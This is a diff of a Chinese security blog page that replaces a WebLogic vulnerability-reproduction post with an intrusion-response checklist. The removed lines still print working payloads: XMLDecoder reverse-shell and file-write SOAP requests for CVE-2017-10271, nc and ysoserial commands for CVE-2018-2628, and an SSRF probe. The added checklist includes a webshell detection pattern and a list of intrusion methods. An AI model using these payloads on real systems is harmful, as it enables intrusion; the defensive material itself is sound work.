@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现," />
+  <meta name="keywords" content="入侵分析," />
 
 
 
@@ -86,24 +86,18 @@
 
 
 
-<meta name="description" content="CVE-2017-10271、CVE-2018-2628、SSRF">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="应用服务器入侵应急分析手工排查">
+<meta name="keywords" content="入侵分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Weblogic">
-<meta property="og:url" content="http://yoursite.com/2018/07/05/weblogic/index.html">
+<meta property="og:title" content="入侵应急分析排查">
+<meta property="og:url" content="http://yoursite.com/2018/07/29/入侵应急分析排查/index.html">
 <meta property="og:site_name" content="BEHIND THE GROWTH">
-<meta property="og:description" content="CVE-2017-10271、CVE-2018-2628、SSRF">
+<meta property="og:description" content="应用服务器入侵应急分析手工排查">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/10271.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/10271shell.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/bashEncode.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/2628.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/05/weblogic/ssrf.png">
-<meta property="og:updated_time" content="2018-08-01T02:59:15.801Z">
+<meta property="og:updated_time" content="2018-08-02T02:54:39.541Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Weblogic">
-<meta name="twitter:description" content="CVE-2017-10271、CVE-2018-2628、SSRF">
-<meta name="twitter:image" content="http://yoursite.com/2018/07/05/weblogic/10271.png">
+<meta name="twitter:title" content="入侵应急分析排查">
+<meta name="twitter:description" content="应用服务器入侵应急分析手工排查">
 
 
 
@@ -133,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/07/05/weblogic/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/07/29/入侵应急分析排查/"/>
 
 
 
 
 
-  <title>Weblogic | BEHIND THE GROWTH</title>
+  <title>入侵应急分析排查 | BEHIND THE GROWTH</title>
   
 
 
@@ -276,7 +270,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/05/weblogic/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/29/入侵应急分析排查/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="WyyFree">
@@ -293,7 +287,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Weblogic</h1>
+          <h1 class="post-title" itemprop="name headline">入侵应急分析排查</h1>
         
 
         <div class="post-meta">
@@ -305,8 +299,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-05T14:12:00+08:00">
-                2018-07-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-29T14:39:00+08:00">
+                2018-07-29
               </time>
             
 
@@ -328,8 +322,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/安全审计/" itemprop="url" rel="index">
+                    <span itemprop="name">安全审计</span>
                   </a>
                 </span>
 
@@ -352,7 +346,7 @@
 
           
               <div class="post-description">
-                  CVE-2017-10271、CVE-2018-2628、SSRF
+                  应用服务器入侵应急分析手工排查
               </div>
           
 
@@ -369,151 +363,157 @@
       
 
       
-        <h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><center>
-
-<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p></p></center><p></p>
-<ul>
-<li>Weblogic &lt; 10.3.6 ‘wls-wsat’ <strong>XMLDecoder</strong> 反序列化漏洞（CVE-2017-10271）</li>
-</ul>
-<p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p>
-<ul>
-<li>漏洞位置<pre><code>http://127.0.0.1:7001/wls-wsat/CoordinatorPortType
-</code></pre></li>
-</ul>
+        <p><hr></p>
 <center>
 
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p></p></center><p></p>
-<ul>
-<li><p>反弹shell</p>
-<pre><code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1
-#XML进行解析需要编码
-（bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1）
-#直连nc(nc版本：netcat-traditional - update-alternatives --config nc)
-nc -l -p 8888 -c /bin/bash
-#反连nc
-nc IP PORT -c /bin/bash
-#nc客户端
-nc -nlvp 8888
-</code></pre></li>
-<li><p>数据提交方式和内容类型</p>
-<pre><code>POST /wls-wsat/CoordinatorPortType
-Content-Type: text/xml
-</code></pre></li>
-<li><p>EXP<br><strong>反弹shell</strong></p>
-<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
-&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
-&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
-&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
-&lt;void index=&quot;0&quot;&gt;
-&lt;string&gt;/bin/bash&lt;/string&gt;
-&lt;/void&gt;
-&lt;void index=&quot;1&quot;&gt;
-&lt;string&gt;-c&lt;/string&gt;
-&lt;/void&gt;
-&lt;void index=&quot;2&quot;&gt;
-&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/21 0&amp;gt;&amp;amp;1&lt;/string&gt;
-&lt;/void&gt;
-&lt;/array&gt;
-&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
-&lt;/java&gt;
-&lt;/work:WorkContext&gt;
-&lt;/soapenv:Header&gt;
-&lt;soapenv:Body/&gt;
-&lt;/soapenv:Envelope&gt;
-</code></pre><p><strong>写入文件</strong></p>
-<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
-    &lt;soapenv:Header&gt;
-    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
-    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
-    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt;
-    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
-    &lt;![CDATA[
-&lt;% out.print(&quot;hack&quot;); %&gt;
-    ]]&gt;
-    &lt;/string&gt;
-    &lt;/void&gt;
-    &lt;void method=&quot;close&quot;/&gt;
-    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
-    &lt;/work:WorkContext&gt;
-    &lt;/soapenv:Header&gt;
-    &lt;soapenv:Body/&gt;
-&lt;/soapenv:Envelope&gt;
-</code></pre><p>  文件写入位置：/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war<br>  URL : <a href="http://127.0.0.1:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://127.0.0.1:7001/bea_wls_internal/test.jsp</a><br><img src="/2018/07/05/weblogic/10271.png" alt="BP"><br><img src="/2018/07/05/weblogic/10271shell.png" alt="BP"></p>
-</li>
+<h2 id="事件类型，排查步骤"><a href="#事件类型，排查步骤" class="headerlink" title="事件类型，排查步骤"></a>事件类型，排查步骤</h2><p></p></center><p></p>
+<h3 id="事件类型"><a href="#事件类型" class="headerlink" title="事件类型"></a>事件类型</h3><ul>
+<li>Web入侵：挂马、篡改、Webshell</li>
+<li>系统入侵：系统异常、登录爆破、系统漏洞</li>
+<li>病毒木马：远控、后门、垃圾软件</li>
+<li>信息泄漏：脱库、数据库注入、弱口令登录</li>
+<li>网络流量：频繁发包、批量请求、DDOS</li>
 </ul>
-<p><strong><a href="https://github.com/WyyFree/vule/blob/master/vulhub/weblogic/CVE-2017-10271/exploit.py" target="_blank" rel="noopener">EXP脚本</a></strong></p>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p><strong>攻击类型定位 –&gt; 确定时间范围 –&gt; 进程分析 –&gt; 文件分析 –&gt; 系统分析 –&gt; 日志分析 –&gt; 关联分析 –&gt; 推理总结</strong><br>注：<br>1、时间范围界定，关键操作时间点串联<br>2、Web入侵shell定位</p>
 <p><hr></p>
-<h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><center>
-
-<h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p></p></center><p></p>
-<ul>
-<li>Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）<br>该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</li>
-</ul>
 <center>
 
-<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p></p></center><p></p>
-<ul>
-<li>工具</li>
+<h2 id="系统信息排查"><a href="#系统信息排查" class="headerlink" title="系统信息排查"></a>系统信息排查</h2><p></p></center><p></p>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><ul>
+<li>查看系统变量的设置：set</li>
+<li>Windows 计划任务：at / 计算机管理 -&gt; 任务计划程序</li>
+<li>Windows 帐号信息：net users / 计算机管理 -&gt; 本地用户和组</li>
+<li>查看开机启动项：msconfig</li>
+<li>检索注册表，SAM文件及远控类软件</li>
+<li>systeminfo信息，系统版本以及补丁信息</li>
 </ul>
-<p>1、<strong><a href="https://github.com/WyyFree/vule/tree/master/vulhub/weblogic/CVE-2018-2628" target="_blank" rel="noopener">ysoserial-JRMPServer、expolit.py</a></strong><br>2、<strong><a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">编码</a>&nbsp;&nbsp;&nbsp;&nbsp;因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义。例如，ls &gt; dir_listing在shell中执行应该将当前目录的列表输出到名为的文件中dir_listing。但是在exec()函数的上下文中，该命令将被解释为获取&gt;和dir_listing目录的列表</strong><br><img src="/2018/07/05/weblogic/bashEncode.png" alt="bash"></p>
-<ul>
-<li><p>开启JRMPServer监听</p>
-<pre><code>java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
-e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections1 &apos;nc 172.18.0.1 8888 -c /bin/bash&apos;
+<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><ul>
+<li>查看命令历史(.bash_history)<br>1、下载文件(wget)<br>2、尝试远程(ssh、scp)<br>3、打包数据(tar、zip)<br>4、对系统进行配置(vim、export、echo $PATH)</li>
+<li>查看用户相关信息<br>1、useradd、userdel<br>2、/etc/passwd<pre><code>查看UID为0的帐号
+cat /etc/passwd | awk -F&apos;:&apos; &apos;{if($3==0)print $0}&apos;
+查看能登录的帐号
+cat /etc/passwd | grep /bin/bash
 </code></pre></li>
-<li><p>使用expolit反弹shell</p>
-<pre><code>python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
-e.g. python exploit.py 172.18.0.2 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.18.0.1 6666 JRMPClient
-</code></pre></li>
-</ul>
-<p><img src="/2018/07/05/weblogic/2628.png" alt="shell"></p>
-<ul>
-<li><strong>注：</strong><br>  1、执行命令不会返回执行结果<br>  2、执行的command中不能存在特殊字符(&gt;)，需要进行command编码才能执行</li>
+<li>查看任务计划<br>1、列出任务计划：rontab -l<br>2、排查任务计划文件：ls /etc/cron*</li>
+<li>查看开机加载项<br>1、rc.local文件(/etc/init.d[rc.local] - ls -alt /etc/init.d/<br>2、chkconfig/sysv-rc-conf</li>
+<li>查看用户登录信息<br>1、lastlog：系统中所有用户最近一次登录信息<br>2、lastb：用户错误的登录列表<br>3、last：用户最近的登录信息<br>4、ssh连接日志(authpriv.*)：auth.log[secure]</li>
 </ul>
 <p><hr></p>
-<h2 id="SSRF-Weblogic"><a href="#SSRF-Weblogic" class="headerlink" title="SSRF(Weblogic)"></a>SSRF(Weblogic)</h2><center>
-
-<h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p></p></center><p></p>
-<ul>
-<li>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</li>
-</ul>
 <center>
 
-<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p></p></center><p></p>
-<ul>
-<li>漏洞位置<pre><code>/uddiexplorer/SearchPublicRegistries.jsp
+<h2 id="进程信息分析"><a href="#进程信息分析" class="headerlink" title="进程信息分析"></a>进程信息分析</h2><p></p></center><p></p>
+<h3 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h3><ul>
+<li>查看目前的网络连接，定位已经建立的连接(ESTABLISHED)<pre><code>netstat -ano | findstr ESTABLISHED
 </code></pre></li>
-<li><p>漏洞参数</p>
-<pre><code>operator=http://127.0.0.1:7001
-* 通过遍历&quot;http://%s:%s&quot; % (IP,PORT)来做内网探测
+<li>根据PID进行进程定位<pre><code>tasklist [\svc]| findstr PID
+结束可疑的进程
+tskill PID|EXENAME
 </code></pre></li>
-<li><p>请求Header</p>
-<pre><code>POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
-Host: 127.0.0.1:7001
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp
-Connection: close
-Upgrade-Insecure-Requests: 1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 125
-
-operator=http://127.0.0.1&amp;rdoSearch=name&amp;txtSearchname=&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
-</code></pre></li>
-<li><p>请求返回值</p>
-<pre><code>&lt;p&gt;An error has occurred&lt;BR&gt;
-</code></pre><p>通过返回值的不同判断内网环境</p>
-<pre><code>#连接失败
-addresses, but could not connect over HTTP to server
-#连接成功
-The server at http://127.0.0.1:7001 returned a 404 error code
-</code></pre><p><img src="/2018/07/05/weblogic/ssrf.png" alt="ssrf"></p>
-</li>
 </ul>
+<h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h3><ul>
+<li>网络连接，PORT、IP、PID<pre><code>netstat -anltp
+</code></pre></li>
+<li>进程分析<pre><code>ps aux | grep PID
+</code></pre></li>
+<li>端口分析<pre><code>lsof -i:PORT
+</code></pre></li>
+<li>查看系统命令是否被修改<pre><code>ls -alt /usr/bin\[sbin] | head -n 10
+</code></pre></li>
+</ul>
+<p><hr></p>
+<center>
+
+<h2 id="文件信息分析"><a href="#文件信息分析" class="headerlink" title="文件信息分析"></a>文件信息分析</h2><p></p></center><p></p>
+<h3 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h3><ul>
+<li>文件属性(时间)</li>
+<li>浏览器记录(浏览历史，下载文件，cookie)</li>
+<li>最近访问文件<pre><code>*\User\Recent
+%UserProfile%\Recent
+</code></pre></li>
+<li>文件夹搜索<br>1、支持正则匹配<br>2、支持类型匹配(类型:.csv)<br>3、支持时间匹配</li>
+<li>command：findstr<pre><code>查看日志中访问上传文件夹的记录
+findstr /s /m /I &quot;UploadFiles&quot; *.log
+查找含有某关键字的文件
+findstr /s /m /I &quot;str&quot; *.aspx
+</code></pre></li>
+</ul>
+<h3 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h3><ul>
+<li>敏感文件<br>1、/tmp/、/etc/init.d[passwd、shadow]、/usr/bin[sbin]<br>2、按时间排序显示：ls -alt<br>3、查看文件详细信息：stat FILE</li>
+<li><p>新增文件分析<br>1、24小时内被修改的jsp文件</p>
+<pre><code>find ./ -mtime 0 -name &quot;\*.jsp&quot;
+</code></pre><p>2、查找2天内新增的文件</p>
+<pre><code>find / -ctime -2
+</code></pre><p>3、特殊权限文件</p>
+<pre><code>find / *.jsp -perm 4777
+</code></pre><p>4、文件目录下关键字搜索</p>
+<pre><code>grep -r STRING
+</code></pre></li>
+<li><p>涉及文件分析的命令集</p>
+<pre><code>find grep ls stat
+</code></pre></li>
+</ul>
+<p><hr></p>
+<center>
+
+<h2 id="后门排查"><a href="#后门排查" class="headerlink" title="后门排查"></a>后门排查</h2><p></p></center><p></p>
+<h3 id="Windows-3"><a href="#Windows-3" class="headerlink" title="Windows"></a>Windows</h3><ul>
+<li>PC Hunter<pre><code>http://www.xuetr.com/
+</code></pre></li>
+<li>webshell<pre><code>应用目录拷贝，进行恶意函数匹配
+工具：河马、D盾...
+</code></pre></li>
+</ul>
+<h3 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h3><ul>
+<li>工具<br>1、chkrootkit<pre><code>chkrootkit | grep INFECTED
+</code></pre>2、rkhunter<pre><code>rkhunter --update
+rkhunter --check --sk
+</code></pre></li>
+<li>webshell查找<br>Webshell的排查可以通过文件、流量、日志 三种方式进行分析,基于文件的命名特征和内容特征,相对操作性较高,在入侵后应急过程中频率也比较高<pre><code>find ./ -name &quot;*.php&quot; | xargs egrep &quot;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|assert|phpspy|c99sh|milw0rm|eval|\(gunerpress||\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\{\&quot;\_P|eval\(\$\_R|file_put_content|base64_decode&quot;
+</code></pre></li>
+</ul>
+<p>综上所述,通过chkrootkit 、rkhunter、RPM check、Webshell Check 等手段得出以下应对措施:</p>
+<ol>
+<li>根据进程、连接等信息关联的程序,查看木马活动信息。</li>
+<li>假如系统的命令(例如netstat ls 等)被替换,为了进一步排查,需要下载一新的或者从其他未感染的主机拷贝新的命令。</li>
+<li>发现可疑可执行的木马文件,不要急于删除,先打包备份一份。</li>
+<li>发现可疑的文本木马文件,使用文本工具对其内容进行分析,包括回连IP地址、加密方式、关键字(以便扩大整个目录的文件特征提取)<br>……</li>
+</ol>
+<p><hr></p>
+<center>
+
+<h2 id="常见入侵方式Getshell方法"><a href="#常见入侵方式Getshell方法" class="headerlink" title="常见入侵方式Getshell方法"></a>常见入侵方式Getshell方法</h2><p></p></center><p></p>
+<ul>
+<li>Web入侵</li>
+</ul>
+<ol>
+<li>典型漏洞:注入Getshell , 上传Getshell,命令执行Getshell,文件包含Getshell,代码执行Getshell,编辑器getshell,后台管理Getshell,数据库操作Getshell</li>
+<li>容器相关:Tomcat、Axis2、WebLogic等中间件弱口令上传war包等,Websphere、weblogic、jboss反序列化,Struts2代码执行漏</li>
+</ol>
+<ul>
+<li>系统入侵</li>
+</ul>
+<ol>
+<li>SSH 破解后登录操作</li>
+<li>RDP 破解后登录操作</li>
+<li>MSSQL破解后远控操作</li>
+<li>SMB远程命令执行(MS08-067、MS17-010、CVE-2017-7494)</li>
+<li>密码读取<pre><code>a) Windows: Mimikatz
+b) Linux: mimipenguin
+</code></pre></li>
+</ol>
+<ul>
+<li>典型应用</li>
+</ul>
+<ol>
+<li>Mail暴力破解后信息挖掘及漏洞利用</li>
+<li>VPN暴力破解后绕过边界</li>
+<li>Redis 未授权访问或弱口令可导ssh公钥或命令执行</li>
+<li>Rsync 未授权访问类</li>
+<li>Mongodb未授权访问类</li>
+<li>Elasticsearch命令执行漏洞</li>
+<li>Memcache未授权访问漏洞</li>
+<li>服务相关口令(mysql ldap zebra squid vnc smb)</li>
+</ol>
 
       
     </div>
@@ -531,7 +531,7 @@ The server at http://127.0.0.1:7001 returned a 404 error code
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" <i class="fa fa-tag"></i> 漏洞复现</a>
+            <a href="/tags/入侵分析/" <i class="fa fa-tag"></i> 入侵分析</a>
           
         </div>
       
@@ -544,14 +544,18 @@ The server at http://127.0.0.1:7001 returned a 404 error code
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/07/29/业务安全测试/" rel="next" title="Web业务安全测试">
+                <i class="fa fa-chevron-left"></i> Web业务安全测试
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/07/09/jboss/" rel="prev" title="Jboss">
-                Jboss <i class="fa fa-chevron-right"></i>
+              <a href="/2018/07/29/日志分析/" rel="prev" title="日志分析">
+                日志分析 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -688,7 +692,7 @@ The server at http://127.0.0.1:7001 returned a 404 error code
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-10271"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-10271</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#描述"><span class="nav-number">1.1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2018-2628"><span class="nav-number">2.</span> <span class="nav-text">CVE-2018-2628</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#描述-1"><span class="nav-number">2.1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">2.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF-Weblogic"><span class="nav-number">3.</span> <span class="nav-text">SSRF(Weblogic)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#描述-2"><span class="nav-number">3.1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-2"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#事件类型，排查步骤"><span class="nav-number">1.</span> <span class="nav-text">事件类型，排查步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件类型"><span class="nav-number">1.1.</span> <span class="nav-text">事件类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#步骤"><span class="nav-number">1.2.</span> <span class="nav-text">步骤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#系统信息排查"><span class="nav-number">2.</span> <span class="nav-text">系统信息排查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows"><span class="nav-number">2.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux"><span class="nav-number">2.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进程信息分析"><span class="nav-number">3.</span> <span class="nav-text">进程信息分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-1"><span class="nav-number">3.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-1"><span class="nav-number">3.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件信息分析"><span class="nav-number">4.</span> <span class="nav-text">文件信息分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-2"><span class="nav-number">4.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-2"><span class="nav-number">4.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#后门排查"><span class="nav-number">5.</span> <span class="nav-text">后门排查</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows-3"><span class="nav-number">5.1.</span> <span class="nav-text">Windows</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-3"><span class="nav-number">5.2.</span> <span class="nav-text">Linux</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见入侵方式Getshell方法"><span class="nav-number">6.</span> <span class="nav-text">常见入侵方式Getshell方法</span></a></li></ol></div>
             
 
           </div>
